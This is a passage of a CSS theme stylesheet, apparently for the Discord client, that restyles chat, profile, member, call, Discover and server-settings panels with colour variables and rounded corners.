    padding-bottom: 80px;
    margin-bottom: -70px;

}

.button-1YfofB.buttonColor-7qQbGO {
    background-color: var(--Color003);
    color: var(--Color007);
}

/* Profile */

.container-3baos1 {
	z-index: 9;
	position: relative;
	background: var(--Color005);
	border-radius: var(--Radius001);
}

.panels-j1Uci_ {
	background: var(--Color003);
}
/* Profile Hover */

.panels-j1Uci_ > .container-3baos1:hover button.button-14-BFJ{
  display: block;
}

.panels-j1Uci_ > .container-3baos1 button[aria-checked="false"], .panels-j1Uci_ > .container-3baos1 button:not([role="switch"]) {
  display: none;
}

/* Game Icon */

.gameIcon-gg34Dz, .icon-3Oovq9 {
    border-radius: var(--Radius002);
    color: var(--Color006);
}

/* No Shaddow */

.panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy {
    text-shadow: none;
}


.panels-j1Uci_ > .container-3baos1:last-child .avatar-SmRMf2.wrapper-3t9DeA, .panels-j1Uci_ > .container-3baos1:last-child .nameTag-3uD-yy, .panels-j1Uci_ > .container-3baos1:last-child .button-38aScr {
    filter: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Topic Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* No Divider */

.content-yTz4x3:before, .divider-3FBTu8{
    display: none;
}

:root{
    --elevation-low: none;
}

.channelNotice-3DDmsB{
    box-shadow: none;
}

.attachWrapper-2TRKBi, .panel-24C3ux, .peopleListItem-2nzedh, .rowWrapper-2fB6P0+.rowWrapper-2fB6P0 .row-ZLfFhY, .header-39GIC8, .headerCell-3L6rFG{
    border: none;
}

/* Channel Info */

.children-19S4PO {
	background: var(--Color004);
	border-radius: 90px;
	Padding: 6px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Tool Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.toolbar-1t6TWx {
	background: var(--Color004);
	border-radius: 90px;
    Padding: 6px;
    margin-left: 20px;
}

.container-1r6BKw {
    padding-right: 12px;
    padding-left: 0px;
}

/* Selected Icon */

.selected-1GqIat .icon-22AiRD {
    color: var(--Color006);
}

/* Update Icon */

.updateIconForeground-3tnNZn {fill: var(--Color010)}
.updateIconForeground-3tnNZn:hover {fill: var(--Color010)}
.updateIconForeground-3tnNZn:active {fill: var(--Color010)}

/* Searchbar */

.searchBar-3dMhjb {
    background: transparent;
}

/* Follow Button */

.theme-dark .lookFilled-1Gx00P.colorPrimary-3b3xI6 {
    background: var(--Color001);
}

.container-1r6BKw.themed-ANHk51 {
    background: var(--Color003);
	height: 60px;
}

.header-2o-2hj {
    position: relative;
    font-weight: 500;
    padding: 0 16px;
    -webkit-box-sizing: border-box;
    box-sizing: border-box;
    display: -webkit-box;
    display: -ms-flexbox;
    display: flex;
    -webkit-box-align: center;
    -ms-flex-align: center;
    align-items: center;
    z-index: 3;
    -webkit-transition: background-color .1s linear;
    transition: background-color .1s linear;
    color: var(--header-primary);
    -webkit-box-shadow: var(--elevation-low);
    box-shadow: var(--elevation-low);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.content-yTz4x3 {
    padding-right: 12px;
}

.chatContent-a9vAAp {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-bottom: 28px;
}

.content-yTz4x3 {
    background-color: var(--Color003);
}



/* No Scrollbar*/

.scrollerBase-289Jih::-webkit-scrollbar{
    display: none;
}

/* Reaction */

.reaction-1hd86g {
    background: var(--Color003);
    border-radius: 1rem;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Round Media |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Round Image */

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/* Round video */

.wrapper-2TxpI8 {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Embed |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.embedFull-2tM8-- {
    background: var(--Color005);
    border-top-right-radius: 24px;
	border-bottom-right-radius: 24px;
    border-left: 5px solid var(--Color001);
}

.embedAuthorName-3mnTWj, .embedAuthorNameLink-1gVryT, .embedDescription-1Cuq9a, .embedFieldName-NFrena, .embedFieldValue-nELq2s, .embedFooterText-28V_Wb, .embedLink-1G1K1D, .embedProvider-3k5pfl, .embedTitle-3OXDkz, .embedTitleLink-1Zla9e {
    text-align: left;
}

.imageWrapper-2p5ogY {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Mention |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

#app-mount .chat-3bRxxu .messagesWrapper-3lZDfY .cozyMessage-3V1Y8y:not(.groupStart-23k01U) {
  padding-bottom: 20px;
  margin-top: -22px;
  border-bottom-right-radius: 24px;
  border-bottom-left-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Quotes like embeds ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.theme-dark .blockquoteContainer-U5TVEi blockquote {
    background-color: var(--Color003);
    border-color: var(--Color003);

}

.blockquoteContainer-U5TVEi blockquote {
    border: 2px solid;
    border-top-right-radius: 24px;
 	border-bottom-right-radius: 24px;
    padding: 8px 12px 4px;
   	margin-bottom: 20px;

}

.blockquoteContainer-U5TVEi .blockquoteDivider-2hH8H6 {
    border-radius: 4px 0px 0px 4px;
  	background-color: var( --Color001);
    margin-bottom: 20px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Download ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.attachment-33OFj0 {
    border: none;
    background-color: var(--Color005);
	border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Message |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.unreadPill-2HyYtt{
	background: var(--Color001);
    border-radius: 90px;
    padding: 6px;

margin-right: -2px;
    width: 3%;
}

.unreadPillCap-3_K2q2{
    display: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Message Divider |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

:root .divider-JfaTT5{
    border:  1px solid var(--Color001);
    margin-left: 0px;
    margin-right: 22px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Time Divider ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.content-1o0f9g {
    background: var(--Color003);
    border-radius: 90px;
    width: 100%;
    padding: 8px;
    text-align: center;
	padding-right: 50px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | New Member ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Text */

.content-2M3n_H {
	padding-left: 34px;
}

/* Icon */

.iconContainer-3GkGRf {
    position: absolute;
    left: 4px;
    padding-top: .16rem;
}

/* Background */

.container-3-pyIM {
	background: var(--Color003);
	border-radius: 90px;
	padding: 8px
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Code Menu |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.markup-2BOw-j code {
    background: var(--Color005);
    border: transparent;
    border-radius: 8px;
}

.hljs .powercord-lines:after {
    padding-right: 8px;
    left: 3px;
    border-right: 1px solid var(--Color005);
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Emoji Info ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.emojiSection-3Fb9ix {
    background: var(--Color005);

}

.container-ZRw2kD {
    width: auto;
    border-radius: 24px;
	box-shadow: 0px 8px 12px -2px var(--Color005);
}

.guildSection-1EoFKd {
    background: var(--Color004);
    padding: 16px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Chat Panel | Follow Channel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.wrapper-39oAo3 {
    background-color: var(--Color005);
    border-radius: var(--Radius001);
    margin-bottom: 0px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Chatbox Panel |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* Typing */

.typing-2GQL18 {
    position: sticky;
	z-index: 4;
    margin-bottom: -28px;
    margin-left: 0px;
    padding-top: 4px
}

.base-gE7OpD {
    color: var(--Color008);
    font-size: 12px;
    font-weight: 500;
    line-height: 24px;

}

/* Background */

.scrollableContainer-2NUZem {
	position: relative;
    background: var(--Color005);
    max-height: 37vh;
  	border-radius: 24px;
	z-index: 90;
	padding-top: 4px;
	padding-bottom: 4px;
    padding-right: 12px;
}

.scrollableContainer-2NUZem::-webkit-scrollbar {
    display: none;

}




.form-2fGMdU {
    padding-left: 0px;
    padding-right: 0px;

}

.characterCount-1cRDo2 {
	z-index: 3;
}

.channelTextArea-rNsIhG {
    margin-bottom: -3px;
	border-radius: 24px;
}

.theme-dark .form-2fGMdU:before {
	background: transparent;
}

/* Text Align */

.slateTextArea-1Mkdgw {
    text-align: left;
	margin-left: 12px;
}

.placeholder-37qJjk {
    left: 28px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Member Panel ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.members-1998pB, .members-1998pB>div {
    background-color: var(--Color004);
	border-radius: 24px;
	margin-left: 12px;
    margin-bottom: 25px;
}

.members-1998pB {
    width: 236px;
    padding-bottom: 40px;

}

.member-3-YXUe {
    margin-left: 2px;
    padding-right: 8px;
}


/* Bot Tags */

.botTag-2WPJ74 {
    border-radius: 24px !important;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Sidebar */

.scroller-1JbKMe {
    background: var(--Color004);
    border-top-right-radius: 20px;
    border-top-left-radius: 20px;
}

#app-mount .sidebar-2K8pFh {
    background: transparent !important;
    border-radius: 23px;
    margin-top: 12px;
    margin-right: 12px;
    margin-left: 12px;
    margin-bottom: 24px;
}

.layout-2DM8Md {
    border-radius: 90px;
    margin-right: 12px;
    margin-left: 6px;
}

/* Sidebar Button */

.selected-aXhQR6 .layout-2DM8Md {
    background: var(--Color003);
}

/* Searchbar */

.privateChannels-1nO12o {
    background: transparent;
    margin-bottom: -20px;
}

.searchBar-6Kv8R2 .searchBarComponent-32dTOx {
    background: var(--Color005);
    color: var(--Color009);
    border-radius: 90px;


    margin-right: 6px;
    margin-left: 4px;

    height: 28px;
    overflow: hidden;

    -webkit-box-shadow: none;
    box-shadow: none;

    text-align: center;
}



/* Topbar */

.topPill-30KHOu .item-PXvHYJ {
    border-radius: 94px;
    margin: 0 8px;
    padding: 2px 12px;
}

/*  Friendstatus */

.peopleColumn-29fq28 {
	border-radius: 24px;
    background: var(--Color004);
}

.tabBody-3YRQ8W {
    background: var(--Color003);
    padding-bottom: 25px;
}

/*  Friendstatus | Buttons*/

.actionButton-uPB8Fs {
    background: var(--Color003);
}

/*  Friendstatus | Avatar*/

.wrapper-3t9DeA, .avatar-3W3CeO {
    background: transparent;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Active Now |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/* No Header */

.header-13Cw0- {
	display: none;
}

/* Empty Card */

.emptyCard-1RJw8n {
    border-radius: 24px;
    padding: 24px;
}

/* Background */

.nowPlayingScroller-2XrVUt {
    padding-top: 0px;
    padding-left: 12px;
}

.wrapper-3D2qGf {
    background-color: var(--Color004);
  	border-radius: 24px;
}

.nowPlayingColumn-2sl4cE {
    background: var(--Color003);

}

.emptyCard-1RJw8n {
    background: var(--Color004);
}

/* Items */

.section-2gLsgF {
	background: var(--Color003);
  	border-radius: 24px;
    position: relative;
    padding: 12px;
}

.theme-dark .inset-3sAvek {
    background-color: transparent;
}

/* Activity Avatar */

.activitySectionAssets-32WyHu .largeImage-DLXk-f {
	border-radius: 90px;
    width: 32px;
    height: 32px;
}

/* Divider */

.theme-dark .separator-XqIyoz {
    background-color: transparent;
	padding-top: 8px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Home | Nitro ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.homeWrapperNormal-2KSUEa {
    height: 100%;
    background: var(--Color003);
}

.scroller-9moviB {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-right: 12px;
    margin-bottom: 24px;
}

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

/*  Toolbar */

.headerWrapper-3NUKsd {
    padding-top: 6px;
}


/*  Status */

.status-1WEaea {
    background: var(--Color001);
    color: var(--Color006);
}

.wrapper-2qzCYF.minimum-28Z35l {
    height: 280px;
    background: var(--Color003);
}


.voiceCallWrapper-3kPwHm {
    background: var(--Color004);
}

/*  Buttons */

.colorable-1bkp8v.primaryDark-3mSFDl, .colorable-1bkp8v.primaryDark-3mSFDl .centerIcon-2G6o-T {
    color: var(--Color007);
}

.colorable-1bkp8v.primaryDark-3mSFDl {
    background: var(--Color003);
    border-radius: var(--Radius002);
}


.colorable-1bkp8v.red-33-Lnk {
    background: var(--Color001);
    border-radius: var(--Radius002);
}

.colorable-1bkp8v.red-33-Lnk:hover {
    background: var(--Color001);
    border-radius: var(--Radius002);
    filter: brightness(110%);
}

/*  Background */

.flexCenter-2Y_vCg .wrapper-2qzCYF.fullScreen-1tMzXY, .wrapper-2qzCYF.noChat-18KtBD {
    background: var(--Color003);
}

.wrapper-3EGhDO {
    background: var(--Color004);
    padding: 6px 6px 6px 6px;
    border-radius: var(--Radius002);
}

/*  Call Dock */
/*
div[class="flex-1xMQg5 flex-1O1GKY horizontal-1ae9ci horizontal-2EEEnY flex-1O1GKY directionRow-3v3tfG justifyCenter-3D2jYp alignCenter-1dQNNs noWrap-3jynv6"][style="flex: 1 1 auto;"]{
    border-radius: 30px;
    margin-bottom: 21px;
    background: var(--Color004);
}


.colorable-1bkp8v.white-3GPOIp, .colorable-1bkp8v.white-3GPOIp .centerIcon-2G6o-T {
    color: currentColor;
}

.colorable-1bkp8v.primary-3NQg8g,
.colorable-1bkp8v.primary-3NQg8g.active-1QRrIS, .colorable-1bkp8v.primary-3NQg8g:hover,
.colorable-1bkp8v.white-3GPOIp,
.centerButton-3CaNcJ,
.colorable-1bkp8v.white-3GPOIp.active-1QRrIS, .colorable-1bkp8v.white-3GPOIp:hover,
.colorable-1bkp8v.red-33-Lnk {
    background: none  ;
}
*/

/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* ||| Call | Picture in Picture |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */
/* |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| */

.pictureInPictureWindow-1B5qSe{
    border-radius: var(--Radius001);
    width: 440px;
    height: 248px;
    opacity: var(--picture-in-picture);
}

.pictureInPictureWindow-1B5qSe:hover{
        opacity: 100%;
}


/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Background */

.headerImage-3X1tyY, .searchSubtitle-2jsC5X, .searchTitle-36D1cB {
    display: none;
}

#app-mount .sidebar-2K8pFh {
    background: var(--Color004);
}

.theme-dark .pageWrapper-1PgVDX {
    border-radius: 24px;
    background: var(--Color004);
    padding: 0px 0px 0px 0px;
    margin: 12px 13px 25px 12px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Searchbar  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Search Bar */

.search-1iTphC .searchBox-2_mAlO {
    background-color: var(--Color005);
    border-radius: 90px;
    box-shadow: none;
}

.searchHeader-2I26nG {
    margin-bottom: 0px;
    min-height: 0px;
    padding-bottom: 40px;
}

.search-1iTphC .searchBox-2_mAlO .searchBoxInput-K6mkng {
    color: var(--Color008);
    font-size: 16px;
    padding-left: 24px;
}

.search-1iTphC .searchBox-2_mAlO:focus, .search-1iTphC .searchBox-2_mAlO:focus-within {
    box-shadow: none;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Discover | Server Card  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/


/* Background */

.theme-dark .card-3DjzTQ, .theme-dark .iconMask-3b8GzQ {
    background: var(--Color005);
    border-radius: 24px;
	box-shadow: none;
}

.guildListSection-2CS8vH {
    padding-top: 20px;
}

/* Avatar */

.avatar-22otdK {
    border-radius: 24px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Overview  ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

.flag-16iIBd {
    position: relative;
    border-radius: 90px;
    margin-left: 2px;
    width: 36px;
    height: 24px;
}

.theme-dark .container-1nZlH6 {
    background: var(--Color005);
	border: none;
	border-radius: 90px;
}

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Server Menu | Roles  |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/

/* Sidebar */

.scroller-305q3I {
    background: var(--Color004);
    border-radius: var(--Radius001);
    margin-top: 60px;
}

/* Content */

.contentColumnMinimal-2iX-kP {
    background: var(--Color004);
    border-radius: 24px 24px 0 0;
    margin-top: 60px;
    margin-left: 60px;
    margin-right: 60px;
    margin-bottom: 0px;
}

